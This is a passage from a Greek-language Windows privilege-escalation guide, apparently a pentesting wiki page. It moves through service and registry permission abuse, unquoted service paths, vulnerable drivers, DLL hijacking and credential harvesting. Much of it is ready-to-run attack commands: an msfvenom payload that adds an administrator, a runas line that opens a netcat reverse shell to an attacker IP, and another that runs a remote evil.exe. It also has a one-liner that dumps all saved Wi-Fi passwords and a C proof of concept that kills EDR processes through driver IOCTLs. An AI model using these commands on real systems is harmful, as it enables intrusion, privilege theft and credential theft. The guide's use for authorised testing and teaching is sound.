Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας πάνω σε ένα **μητρώο υπηρεσίας** κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί εάν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** κατέχουν δικαιώματα `FullControl`. Εάν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να αλλαχθεί.

Για να αλλάξετε το Path του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Μητρώο υπηρεσιών AppendData/AddSubdirectory δικαιώματα

Αν έχετε αυτό το δικαίωμα πάνω σε ένα μητρώο σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-μητρώα από αυτό**. Στην περίπτωση των Windows υπηρεσιών αυτό είναι **αρκετό για να εκτελέσετε αυθαίρετο κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Καταγράψτε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρώντας αυτές που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα εκτελέσιμο αρχείο υπηρεσίας με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες ανάκτησης

Windows επιτρέπει στους χρήστες να καθορίζουν ενέργειες που θα εκτελεστούν εάν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Εάν αυτό το binary μπορεί να αντικατασταθεί, ενδεχομένως να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **permissions of the binaries** (ίσως να μπορείτε να overwrite κάποιο και να escalate privileges) και των **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Έλεγξε αν μπορείς να τροποποιήσεις κάποιο config file για να διαβάσεις κάποιο ειδικό αρχείο ή αν μπορείς να τροποποιήσεις κάποιο binary που πρόκειται να εκτελεστεί από έναν Administrator account (schedtasks).

Ένας τρόπος να βρεις αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι να κάνεις:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Αν ένας driver εκθέτει ένα arbitrary kernel read/write primitive (συνηθισμένο σε κακώς σχεδιασμένους IOCTL handlers), μπορείτε να ανεβάσετε προνόμια κλέβοντας ένα SYSTEM token απευθείας από τη μνήμη του kernel. Δείτε την βήμα‑προς‑βήμα τεχνική εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου η ευάλωτη κλήση ανοίγει ένα attacker-controlled Object Manager path, η σκόπιμη επιβράδυνση του lookup (χρησιμοποιώντας max-length components ή βαθιές αλυσίδες directories) μπορεί να επεκτείνει το παράθυρο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Οι σύγχρονες ευπάθειες στα hive επιτρέπουν να διαμορφώσετε deterministic layouts, να καταχραστείτε writable HKLM/HKU descendants, και να μετατρέψετε metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθετε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Ορισμένοι signed third‑party drivers δημιουργούν το device object τους με ένα ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να θέσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν επιβάλλεται όταν η συσκευή ανοίγεται μέσω μίας διαδρομής που περιέχει ένα πρόσθετο component, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει ένα handle χρησιμοποιώντας ένα namespace path όπως:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Μόλις ένας χρήστης μπορέσει να ανοίξει τη συσκευή, τα privileged IOCTLs που εκτίθενται από τον driver μπορούν να καταχραστούν για LPE και παραποίηση. Παραδείγματα δυνατοτήτων που παρατηρήθηκαν στην πράξη:
- Επιστροφή handles με πλήρη πρόσβαση σε arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη raw disk read/write (offline tampering, boot-time persistence tricks).
- Τερματισμός arbitrary processes, συμπεριλαμβανομένων Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Μέτρα αντιμετώπισης για προγραμματιστές
- Πάντοτε ορίστε FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε device objects που προορίζονται να περιοριστούν από έναν DACL.
- Επικυρώστε το caller context για privileged operations. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε process termination ή επιστροφές handles.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για άμεσα kernel privileges.

Ιδέες ανίχνευσης για defenders
- Παρακολουθήστε user-mode opens ύποπτων device names (e.g., \\ .\\amsdk*) και συγκεκριμένες IOCTL sequences που υποδηλώνουν κατάχρηση.
- Εφαρμόστε τη vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατηρήστε δικές σας allow/deny λίστες.


## PATH DLL Hijacking

Εάν έχετε **δικαιώματα εγγραφής μέσα σε έναν φάκελο που βρίσκεται στο PATH** μπορεί να καταφέρετε να hijack ένα DLL που φορτώνεται από μια process και **escalate privileges**.

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές σκληροκωδικοποιημένους στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Δείτε αυτή τη σελίδα για εντολές που σχετίζονται με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες [εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το εκτελέσιμο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Εάν αποκτήσετε δικαιώματα root, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσετε `nc.exe` για να ακούσει σε μια θύρα, θα σας ζητηθεί μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το `WSL` filesystem στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για διακομιστές, ιστότοπους και άλλα προγράμματα με τα οποία το **Windows** μπορεί να συνδεθεί αυτόματα για λογαριασμό των χρηστών. Σε πρώτη ανάγνωση, αυτό μπορεί να φαίνεται σαν οι χρήστες να μπορούν να αποθηκεύουν τα διαπιστευτήριά τους για Facebook, Twitter, Gmail κ.λπ., ώστε να συνδέονται αυτόματα μέσω περιηγητών. Αλλά δεν είναι έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία το Windows μπορεί να συνδέει τους χρήστες αυτόματα, πράγμα που σημαίνει ότι οποιαδήποτε **Windows application that needs credentials to access a resource** (διακομιστής ή ιστότοπος) **can make use of this Credential Manager** & Windows Vault και να χρησιμοποιεί τα αποθηκευμένα διαπιστευτήρια αντί οι χρήστες να εισάγουν κάθε φορά το username και το password.

Εκτός εάν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι είναι δυνατόν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Έτσι, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει κάπως να **communicate with the credential manager and request the credentials for that resource** από το προεπιλεγμένο storage vault.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στη μηχανή.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε `runas` με την επιλογή `/savecred` προκειμένου να χρησιμοποιήσετε τα saved credentials. Το παρακάτω παράδειγμα καλεί ένα remote binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα δοσμένο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ή από [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Η **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος για να συνεισφέρει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα στοιχεία σύνδεσης του χρήστη**. Σε σενάρια κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά αυθεντικοποίησης του domain του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, χρησιμοποιώντας το DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, που βρίσκεται στο ίδιο αρχείο μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, εμποδίζοντας την εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** βρίσκονται συνήθως στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσετε.  
Μπορείτε να **εξάγετε πολλούς DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Τα **PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης, ως τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων με ευκολία. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **decrypt** ένα PS credentials από το αρχείο που το περιέχει μπορείτε να κάνετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε σε `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής Διαπιστευτηρίων Απομακρυστικής Επιφάνειας Εργασίας**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε .rdg αρχεία**\
Μπορείτε να **εξάγετε πολλά DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Συχνά οι χρήστες χρησιμοποιούν την εφαρμογή Sticky Notes σε Windows workstations για να **αποθηκεύουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι πρόκειται για αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητήσετε και να το εξετάσετε.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς από AppCmd.exe πρέπει να είστε Administrator και να τρέχετε σε High Integrity level.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\  
Εάν αυτό το αρχείο υπάρχει, τότε είναι πιθανό ότι κάποια **credentials** έχουν ρυθμιστεί και μπορούν να **ανακτηθούν**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν το `C:\Windows\CCM\SCClient.exe` υπάρχει .\
Οι installers εκτελούνται με **SYSTEM privileges**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Μητρώο (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH κλειδιά στο μητρώο

Τα ιδιωτικά SSH κλειδιά μπορούν να αποθηκευτούν στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, γι' αυτό θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε εγγραφή σε αυτή τη διαδρομή, πιθανότατα θα πρόκειται για αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν τρέχει και θέλετε να ξεκινάει αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω κάποια ssh keys, να τα προσθέσω με `ssh-add` και να κάνω login μέσω ssh σε μια μηχανή. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την ασύμμετρη πιστοποίηση κλειδιού.

### Μη επιτηρούμενα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Search for a file called **SiteList.xml**

### Αποθηκευμένος κωδικός GPP

